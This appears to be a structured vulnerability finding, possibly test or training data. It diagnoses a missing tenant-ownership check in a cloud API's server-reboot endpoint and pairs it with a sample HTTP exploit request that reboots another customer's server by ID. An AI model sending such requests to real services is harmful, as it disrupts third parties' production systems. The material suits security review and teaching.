diagnosis: The controller validates that the incoming Sanctum API token has the 'servers:reboot' ability scope but then fetches the target VirtualServer directly by user-supplied ID without verifying tenant ownership. An API token issued to manage a customer's development server can reboot production servers belonging to third parties.
exploit_request:
POST /api/v1/servers/reboot HTTP/1.1
Host: api.computecloud.com
Authorization: Bearer 61|validscopedtoken123456789
Content-Type: application/json

{"server_id": 9901}
